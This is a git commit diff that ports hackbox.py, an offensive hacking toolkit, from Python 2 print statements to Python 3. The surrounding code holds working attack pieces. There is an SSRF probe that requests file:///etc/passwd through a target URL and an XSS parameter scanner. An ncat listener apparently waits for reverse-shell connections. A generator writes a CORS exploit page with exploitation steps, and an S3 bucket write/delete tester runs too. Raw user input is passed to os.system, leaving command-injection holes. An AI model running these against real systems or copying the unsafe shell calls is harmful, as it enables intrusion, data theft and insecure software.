20d5c0057f85f80a13fc1bc0ae520c44a8b45105
cclauss <cclauss@bluewin.ch>
2018-04-24 18:25:31 -0600

    print() is a function in Python 3

--- hackbox.py
+++ hackbox.py
@@ -3,44 +3,40 @@
 # !Author: Suleman Malik
 # !Contact: samhax@protonmail.com
 
-from string import whitespace
+from __future__ import print_function
+
 import httplib
-import urllib
-import socket
-import urlparse
 import os
-import sys
-import time
-from colorama import *
-import httplib
-import collections
+import random
 import re
-import time
-import optparse
-import os
-import signal
+import socket
 import ssl
 import sys
-import random
-import dns.resolver
+import time
+import urllib
+import urlparse
 from datetime import datetime
+from string import whitespace
 from threading import Thread
-from urllib import urlopen
+
+import dns.resolver
+from colorama import *
+
 
 def again():
     inp = raw_input("\n[e]xit or launch [a]gain? (e/a)").lower()
     if inp == 'a':
         repeat()
     elif inp == 'e':
-        print "\nQuitting...";
+        print("\nQuitting...")
     else:
         print("[!] Incorrect option selected")
         again()
 def li():
-    print "===================================="
+    print("====================================")
 def subd():
-    version = "1";
-    build = "0.1";
+    version = "1"
+    build = "0.1"
     try:
         import urllib.request as urllib2
     except ImportError:
@@ -170,7 +166,7 @@ def subd():
         return subs_sorted
     def check_resolvers(file_name):
         txt = 'Checking sudomains...'
-        print txt
+        print(txt)
         ret = []
         resolver = dns.resolver.Resolver()
         res_file = open(file_name).read()
@@ -240,31 +236,31 @@ def subd():
                 pass
             # make sure everyone is complete
             if threads_remaining <= 0:
-                print " "
-                print "Done. "
+                print(" ")
+                print("Done. ")
                 txt = 'Subdomains found : %s' % (len(subdlist))
                 # Alfab. ordered result list
                 func_writelog('a', logloc, '\n' + txt + '\nOrdered list:\n-------------\n')
-                print txt
-                print ' '
-                print 'Ordered List:'
+                print(txt)
+                print(' ')
+                print('Ordered List:')
                 for result in sorted(subdlist.values()):
                     txt = result
                     func_writelog('a', logloc, str(txt) + '\n')
-                    print txt
-                print ' '
+                    print(txt)
+                print(' ')
                 # IP-ordered result list
                 txt = "IP-ordered List:"
                 func_writelog('a', logloc, '\n' + txt + '\n----------------\n')
-                print txt
+                print(txt)
                 for ips in subiplist:
                     txt = ips
                     func_writelog('a', logloc, str(txt) + '\n')
-                    print txt
+                    print(txt)
                     for ipssub in subiplist[ips]:
                         txt = "      |=> %s" % (ipssub)
                         func_writelog('a', logloc, str(txt) + '\n')
-                        print txt
+                        print(txt)
 
                 end = datetime.now()
                 time_stamp_end = int(time.time())
@@ -275,9 +271,9 @@ def subd():
                 txtB = "Duration : %ss" % (duration)
                 func_writelog('a', logloc, '\n' + txt + '\n')
                 func_writelog('a', logloc, txtB + '\n')
-                print " "
-                print txt
-                print txtB
+                print(" ")
+                print(txt)
+                print(txtB)
                 break
     """
     ON FIRST RUN : SETTING UP BASIC FILES AND FOLDERS
@@ -288,7 +284,7 @@ def subd():
     if not os.path.exists(logdir):
         os.makedirs(logdir)
         txt = "Directory 'log/' created"
-        print txt
+        print(txt)
     """
     :END
     ON FIRST RUN : SETTING UP BASIC FILES AND FOLDERS
@@ -315,18 +311,18 @@ def subd():
                 now.minute) + ":" + str(now.second)
             logfile = target.replace('.', '_') + '_' + str(now.year) + str(now.month) + str(now.day) + str(
                 now.hour) + str(now.minute) + str(now.second) + ".log"
-            print "Creating log : log/%s" % (logfile),
+            print("Creating log : log/%s" % (logfile), end=' ')
             logloc = logdir + "/" + logfile
             with open(logloc, "w") as mylog:
-                os.chmod(logloc, 0660)
+                os.chmod(logloc, 0o660)
                 mylog.write("Log created  - " + version + " build " + build + "\n\n")
-                print ".... Done"
-                print " "
+                print(".... Done")
+                print(" ")
             """ """
             txt = "Scan Started : %s" % (time_start)
             func_writelog('a', logloc, txt + '\n\n')
-            print txt
-            print " "
+            print(txt)
+            print(" ")
             # -- Visible IP --#
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
@@ -338,12 +334,12 @@ def subd():
                 visible_ip = urllib2.urlopen('https://enabledns.com/ip', context=ctx).read()
             txt = "Visible IP : " + visible_ip
             func_writelog("a", logloc, txt + "\n\n")
-            print txt
-            print ' '
+            print(txt)
+            print(' ')
 
             txt = "Subdomains in %s : " % (target)
             func_writelog('a', logloc, txt + '\n')
-            print txt
+            print(txt)
             run_target(target, hosts, resolve_list, 10, True)
             repeat()
 def xss():
@@ -395,7 +391,7 @@ def xss():
             print("| + | " + st0.center(s, " ") + " | " + st1.center(los, " ") + " |")
             print(upb)
             for n, i, d in zip(num, p, status):
-                string = (" %s | %s ") % (str(n), str(i));
+                string = (" %s | %s ") % (str(n), str(i))
                 lofnum = str(n).center(int(len(l)), " ")
                 lofstr = i.center(s, " ")
                 lofst = d.center(los, " ")
@@ -414,11 +410,11 @@ def xss():
             print(
                         "[+] parameters are " + Style.BRIGHT + Fore.GREEN + "not vulnerable" + Style.RESET_ALL + " to XSS.")
         elif c == 1:
-            print("[+] %s Parameter is " + Style.BRIGHT + Fore.RED + "vulnerable" + Style.RESET_ALL + " to XSS.") % c
+            print(("[+] %s Parameter is " + Style.BRIGHT + Fore.RED + "vulnerable" + Style.RESET_ALL + " to XSS.") % c)
         else:
-            print("[+] %s Parameters are " + Style.BRIGHT + Fore.RED + "vulnerable" + Style.RESET_ALL + " to XSS.") % c
-        print("[+] Scan Result for %s:") % d
-        print bg(p, r)
+            print(("[+] %s Parameters are " + Style.BRIGHT + Fore.RED + "vulnerable" + Style.RESET_ALL + " to XSS.") % c)
+        print(("[+] Scan Result for %s:") % d)
+        print(bg(p, r))
         again()
     def GET():
         try:
@@ -482,9 +478,9 @@ def xss():
                             page = urllib.urlopen(data)
                             sourcecode = page.read()
                             if x in sourcecode:
-                                print(
+                                print((
                                                  Style.BRIGHT + Fore.RED + "\n[!]" + " XSS Vulnerability Found! \n" + Fore.RED + Style.BRIGHT + "[!]" + " Parameter:\t%s\n" + Fore.RED + Style.BRIGHT + "[!]" + " Payload:\t%s" + Style.RESET_ALL) % (
-                                     pn, x)
+                                     pn, x))
                                 fresult.append("  Vulnerable  ")
                                 c = 1
                                 total = total + 1
@@ -493,7 +489,7 @@ def xss():
                             else:
                                 c = 0
                     if c == 0:
-                        print( "\n[+] '%s' parameter not vulnerable." ) % pn
+                        print(( "\n[+] '%s' parameter not vulnerable." ) % pn)
                         fresult.append("Not Vulnerable")
                         progress = progress + 1
                         pass
@@ -512,7 +508,7 @@ def xss():
 cwd = os.getcwd()
 def ban():
     with open('exp/ban.md', 'r') as myfile:
-        print myfile.read()
+        print(myfile.read())
 def repeat():
     ban()
     try:
@@ -523,7 +519,7 @@ def repeat():
             ins = int(input("[1] Exploit\n[2] Update Pack\n\nChoice: "))
             if ins == 1:
                 inp = raw_input("Search exploit (e.g wordpress) : ")
-                print '\nSearching exploits...\n'
+                print('\nSearching exploits...\n')
                 time.sleep(5)
                 os.system('cd exp;chmod 777 gs.py;./gs.py ' + inp)
                 repeat()
@@ -536,42 +532,42 @@ def repeat():
             who = raw_input('Domain(e.g google.com): ')
             whois = os.system('curl http://api.hackertarget.com/whois/?q='+who)
             whois1=os.system('whois '+who)
-            print whois
+            print(whois)
             li()
-            print "GEOIP LOCATION"
+            print("GEOIP LOCATION")
             li()
             os.system('curl http://api.hackertarget.com/geoip/?q='+who)
-            print "\n"
+            print("\n")
             li()
             repeat()
         elif choice == 5:
             ssrf = raw_input('URL(e.g http://robert-brook.com/parliament/index.php?page=): ')
             ssrf_result=os.system('curl %sfile:///etc/passwd ' % (ssrf))
-            print ssrf_result
-            print "\n For detail visit https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF"
+            print(ssrf_result)
+            print("\n For detail visit https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF")
             time.sleep(5)
             again()
         elif choice == 6:
             nmp = raw_input('Target Domain/IP (e.g www.google.com): ')
             li()
-            print "\tRunning system nmap"
+            print("\tRunning system nmap")
             li()
             os.system('nmap -sT -sV -sC -PN -A -T5 '+nmp)
             li()
-            print "\tTCP PORT SCANING"
+            print("\tTCP PORT SCANING")
             li()
             os.system('curl http://api.hackertarget.com/nmap/?q='+nmp)
             li()
-            print "\tSUBNET CALCULATION"
+            print("\tSUBNET CALCULATION")
             li()
             os.system('curl https://api.hackertarget.com/subnetcalc/?q='+nmp)
-            print "\n"
+            print("\n")
             again()
         elif choice == 7:
             ins = int(input("[1] Run program\n[2] Install Pack\n\nChoice: "))
             if ins == 1:
                 fn = raw_input('File name (e.g test.js) :')
-                print "\n Extracting Url from Js file..."
+                print("\n Extracting Url from Js file...")
                 li()
                 time.sleep(5)
                 os.system('ruby exp/urlex.rb exp/'+fn)
@@ -583,45 +579,45 @@ def repeat():
             elif ins== 786687:
                 url2 = raw_input('URL (e.g example.com) :')
                 li()
-                print "Searching links from "+url2
+                print("Searching links from "+url2)
                 li()
                 res=os.system('curl http://api.hackertarget.com/pagelinks/?q='+url2)
-                print res
+                print(res)
                 li()
                 repeat()
             else:
-                print ""
+                print("")
                 again()
         elif choice == 8:
            dom = raw_input('Target Domain(e.g google.com): ')
            dom2=' /'
            os.system('python exp/hc.py '+dom+dom2)
-           print "-----------------------------------\n"
+           print("-----------------------------------\n")
            repeat()
         elif choice == 9:
             ch=  int(input('\n[1] Run Listener \n[2] Install Package\n\nSelection:'))
             if ch==1:
                 port=raw_input('Enter listening port: ')
-                print "Incomming connection will be connected automatically on port %s"
+                print("Incomming connection will be connected automatically on port %s")
                 os.system('ncat -vv -n -l -p '+port)
             elif ch==2:
                 os.system('git clone https://github.com/nmap/nmap')
                 os.system('./configure;make;make install')
             else:
-                print "Invalid number. Try again!!"
+                print("Invalid number. Try again!!")
                 again()
         elif choice == 10:
-            print "Gathering information..."
+            print("Gathering information...")
             def net():
                 li()
-                print "\tLISTENING Connections"
+                print("\tLISTENING Connections")
                 li()
                 os.system('lsof -iTCP -sTCP:LISTEN -n -P')
                 li()
-                print "\tESTABLISHED Connections"
+                print("\tESTABLISHED Connections")
                 li()
                 os.system('lsof -s -i -n -P | grep ESTABLISHED')
-                print "\n\n[1] Kill PID\n[2] Return to Menu"
+                print("\n\n[1] Kill PID\n[2] Return to Menu")
                 ch=int(input('\nSelection:'))
                 if ch == 1:
                     pid = raw_input('Enter PID to kill: ')
@@ -630,22 +626,22 @@ def repeat():
                 elif ch == 2:
                     repeat()
                 else:
-                    print "Invalid number. Try again!!"
+                    print("Invalid number. Try again!!")
                     again()
             net()
         elif choice == 11:
             cors = raw_input('Target Url (e.g https://api.edmodo.com/users/id): ')
             evil = raw_input('localhost/IP (e.g https://localhost): ')
-            print "\nSite will be vulnerable to CORS misconfiguration if these 2 headers are present in the response"
-            print "[1]Access-Control-Allow-Credentials: true"
-            print "[2]Access-Control-Allow-Origin: %s" % (evil)
+            print("\nSite will be vulnerable to CORS misconfiguration if these 2 headers are present in the response")
+            print("[1]Access-Control-Allow-Credentials: true")
+            print("[2]Access-Control-Allow-Origin: %s" % (evil))
             li()
             os.system('curl %s -H "Origin: %s" -I ' % (cors, evil))
             exp= raw_input('\n[1]Exploit CORS on %s (y/n): ' % (cors)).lower()
             if exp=='y':
-                print "Creating exploit code..."
+                print("Creating exploit code...")
                 time.sleep(5)
-                print ""
+                print("")
                 f = open('Cors.html', 'w')
                 body = """<!DOCTYPE html>
                 <html>
@@ -677,19 +673,19 @@ def repeat():
                 </html>""" % (cors)
                 f.write(body)
                 f.close()
-                print "exploit created with the name of Cors.html in your current directory"
+                print("exploit created with the name of Cors.html in your current directory")
                 li()
                 print (Style.BRIGHT + Fore.GREEN + "Exploitation Steps"+ Style.RESET_ALL)
-                print "[1] Start apache server on your local host\n[2] Paste cors.html in /var/www/html/"
-                print "[3] Login to %s\n[4] Open cors.html using %s and click exploit" % (cors, evil)
+                print("[1] Start apache server on your local host\n[2] Paste cors.html in /var/www/html/")
+                print("[3] Login to %s\n[4] Open cors.html using %s and click exploit" % (cors, evil))
                 li()
-                print "\nLoading main menu..."
+                print("\nLoading main menu...")
                 time.sleep(3)
                 repeat()
             elif exp=='n':
                 repeat()
             else:
-                print "Invalid number. Try again!!"
+                print("Invalid number. Try again!!")
                 repeat()
         elif choice ==12:
             aws = int(input("[1]Install AWS Package\n[2]AWS Credential\n[3]Run Program\n\nSelection:"))
@@ -699,35 +695,35 @@ def repeat():
                 repeat()
             elif aws ==2:
                 li()
-                print "\t\tSample"
+                print("\t\tSample")
                 li()
-                print """AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
+                print("""AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
 AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
 Default region name: us-west-2
-Default output format: json"""
-                print "\n\n"
+Default output format: json""")
+                print("\n\n")
                 os.system('aws configure')
                 repeat()
             elif aws ==3:
                 aws_program = raw_input('S3 Bucket name (e.g rubyci.s3.amazonaws.com): ')
-                print "\nChecking write permission. Creating test.txt to %s " % (aws_program)
+                print("\nChecking write permission. Creating test.txt to %s " % (aws_program))
                 os.system('aws s3 cp exp/test.txt s3://%s' % (aws_program))
                 time.sleep(5)
-                print "\nTry Listing files from %s" % (aws_program)
+                print("\nTry Listing files from %s" % (aws_program))
                 os.system('aws s3 ls s3://%s' % (aws_program))
                 time.sleep(5)
-                print "\nTry fetching file from %s." % (aws_program)
+                print("\nTry fetching file from %s." % (aws_program))
                 os.system('aws s3 cp s3://%s/test.txt ./' % (aws_program))
                 time.sleep(5)
-                print "\nChecking remove permission. removing test.txt from %s" % (aws_program)
+                print("\nChecking remove permission. removing test.txt from %s" % (aws_program))
                 os.system('aws s3 rm s3://%s/test.txt' % (aws_program))
-                print "Process Done.\n"
+                print("Process Done.\n")
                 again()
             else:
-                print "Invalid number. Try again!!"
+                print("Invalid number. Try again!!")
                 repeat()
         elif choice == 0:
-            print "\nQuitting program...\n";
+            print("\nQuitting program...\n")
         else:
             print("Please enter the correct number")
             repeat()
